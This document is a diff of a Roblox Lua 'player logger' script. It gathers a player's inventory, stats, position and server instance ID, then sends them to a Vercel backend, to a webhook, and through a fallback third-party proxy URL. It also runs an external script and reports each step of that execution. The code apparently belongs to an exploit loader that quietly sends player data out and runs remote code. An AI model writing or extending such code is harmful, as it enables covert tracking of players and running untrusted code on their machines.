@@ -1,6 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
 -- CONFIGURATION
 local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
@@ -25,14 +26,42 @@ local function log(message)
     end
 end
 
+local function makeBackendRequest(url, method, data)
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = url,
+            Method = method,
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["X-Game-ID"] = tostring(game.GameId),
+                ["X-Player-ID"] = tostring(player.UserId)
+            },
+            Body = data and HttpService:JSONEncode(data)
+        })
+    end)
+    
+    if success then
+        return true
+    else
+        log("Request failed to " .. url .. ": " .. tostring(response))
+        return false
+    end
+end
+
 local function collectDetailedData()
-    local character = player.Character or player.CharacterAdded:Wait()
+    local character = player.Character
+    if not character then
+        character = player.CharacterAdded:Wait()
+    end
+    
     local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local position = character:GetPivot().Position
     
     -- Inventory scanning
     local inventory = {}
-    if player:FindFirstChild("Backpack") then
-        for _, item in ipairs(player.Backpack:GetChildren()) do
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
             table.insert(inventory, {
                 name = item.Name,
                 class = item.ClassName
@@ -42,8 +71,9 @@ local function collectDetailedData()
     
     -- Leaderstats scanning
     local stats = {}
-    if player:FindFirstChild("leaderstats") then
-        for _, stat in ipairs(player.leaderstats:GetChildren()) do
+    local leaderstats = player:FindFirstChild("leaderstats")
+    if leaderstats then
+        for _, stat in ipairs(leaderstats:GetChildren()) do
             stats[stat.Name] = stat.Value
         end
     end
@@ -59,7 +89,7 @@ local function collectDetailedData()
         character = {
             health = humanoid and humanoid.Health or 0,
             maxHealth = humanoid and humanoid.MaxHealth or 0,
-            position = character:GetPivot().Position
+            position = position
         },
         instance = {
             jobId = game.JobId,
@@ -125,12 +155,10 @@ local function createRichEmbed(data, messageType)
 
     -- Inventory
     if #data.inventory > 0 then
-        local inventoryStr = table.concat(
-            table.create(#data.inventory, function(i)
-                return string.format("%s (%s)", data.inventory[i].name, data.inventory[i].class)
-            end),
-            "\n"
-        )
+        local inventoryStr = ""
+        for _, item in ipairs(data.inventory) do
+            inventoryStr ..= string.format("%s (%s)\n", item.name, item.class)
+        end
         table.insert(embed.fields, {
             name = "🎒 Inventory ("..#data.inventory..")",
             value = inventoryStr,
@@ -152,6 +180,33 @@ local function createRichEmbed(data, messageType)
     end
 
     return {embeds = {embed}}
+end
+
+local function sendToWebhook(message)
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = message,
+                username = "Game Logger",
+                avatar_url = "https://i.imgur.com/fKfsv2P.png"
+            })
+        })
+    end)
+
+    if not success then
+        log("❌ Failed to send webhook: " .. tostring(response))
+        -- Fallback to backend if direct fails
+        local backendUrl = "https://webhook-git-main-ahmadsaukanihsbs-projects.vercel.app/?webhook=" ..
+            HttpService:UrlEncode(WEBHOOK_URL) .. "&content=" .. HttpService:UrlEncode(message)
+        pcall(function() HttpService:GetAsync(backendUrl) end)
+    else
+        log("✅ Webhook sent successfully")
+    end
 end
 
 local function sendEnhancedWebhook(messageType, customMessage)
@@ -180,50 +235,6 @@ local function sendEnhancedWebhook(messageType, customMessage)
     end
 end
 
--- ====================== [MODIFIED MAIN FUNCTIONS] ======================
-
-local function initialize()
-    log("Initializing player logger for " .. player.Name)
-    sendEnhancedWebhook("LOGGER_STARTED", "Player: "..player.Name)
-    
-    -- Initial registration
-    if registerPlayer() then
-        log("Successfully registered player")
-    else
-        log("Failed to register player")
-    end
-    
-    -- Start periodic reporting
-    spawn(function()
-        while isRunning do
-            updateInstanceStatus("active")
-            sendEnhancedWebhook("PERIODIC_REPORT", "Automatic status update")
-            task.wait(REPORT_INTERVAL)
-        end
-    end)
-    
-    -- Track script execution
-    updateInstanceStatus("script_started")
-    sendEnhancedWebhook("SCRIPT_STARTED", "Executing external script")
-    
-    local scriptSuccess = executeExternalScript()
-    
-    if scriptSuccess then
-        updateInstanceStatus("script_completed")
-        sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
-    else
-        updateInstanceStatus("script_failed", {error = "External script execution failed"})
-        sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
-    end
-end
-
-local function shutdown()
-    isRunning = false
-    updateInstanceStatus("stopped")
-    sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
-end
-
--- [REST OF THE CODE REMAINS EXACTLY THE SAME]
 -- ====================== [DATABASE LOGGING] ======================
 
 local function registerPlayer()
@@ -291,13 +302,14 @@ end
 local function periodicReporting()
     while isRunning do
         updateInstanceStatus("active")
+        sendEnhancedWebhook("PERIODIC_REPORT", "Automatic status update")
         task.wait(REPORT_INTERVAL)
     end
 end
 
 local function initialize()
     log("Initializing player logger for " .. player.Name)
-    sendToWebhook("🔹 Logger started for " .. player.Name)
+    sendEnhancedWebhook("LOGGER_STARTED", "Player: "..player.Name)
     
     -- Initial registration
     if registerPlayer() then
@@ -311,15 +323,16 @@ local function initialize()
     
     -- Track script execution
     updateInstanceStatus("script_started")
+    sendEnhancedWebhook("SCRIPT_STARTED", "Executing external script")
     
     local scriptSuccess = executeExternalScript()
     
     if scriptSuccess then
         updateInstanceStatus("script_completed")
-        sendToWebhook("✅ Script executed successfully for " .. player.Name)
+        sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
     else
         updateInstanceStatus("script_failed", {error = "External script execution failed"})
-        sendToWebhook("❌ Script execution failed for " .. player.Name)
+        sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
     end
 end
 
@@ -327,11 +340,11 @@ end
 local function shutdown()
     isRunning = false
     updateInstanceStatus("stopped")
-    sendToWebhook("🛑 Logger stopped for " .. player.Name)
+    sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
 end
 
 -- Handle graceful shutdown
-game:GetService("UserInputService").InputEnded:Connect(function(input, processed)
+UserInputService.InputEnded:Connect(function(input, processed)
     if input.KeyCode == Enum.KeyCode.End then
         shutdown()
     end
@@ -341,5 +354,5 @@ end)
 local success, err = pcall(initialize)
 if not success then
     updateInstanceStatus("initialization_failed", {error = tostring(err)})
-    sendToWebhook("💥 Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
+    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
 end
